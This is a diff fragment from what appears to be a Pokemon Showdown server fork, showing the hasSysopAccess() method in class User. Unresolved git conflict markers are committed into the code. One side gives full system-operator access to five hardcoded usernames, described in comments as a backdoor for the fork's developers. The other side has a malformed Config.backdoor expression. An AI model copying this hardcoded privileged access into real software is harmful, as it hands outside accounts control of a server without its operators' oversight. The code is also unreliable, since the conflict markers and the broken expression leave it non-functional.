@@ -482,7 +482,11 @@ class User {
 	 */
 	// Put sysops for your server here. NOT on in the array 4 lines down from here, that one is for Exiled sysops so we can help you incase of an emergency.
 	hasSysopAccess() {
+<<<<<<< HEAD
 		if (this.isSysop && Config.backdoor || ["insist", "volco", "vxn", "mewth", "princessteddiursa"].includes(this.userid)) {
+=======
+		if (this.isSysop && Config.backdoor ['sysopusername'].includes(this.userid)) {
+>>>>>>> 7e13a41eea6b059cfa9c8489952f90e048ecd641
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
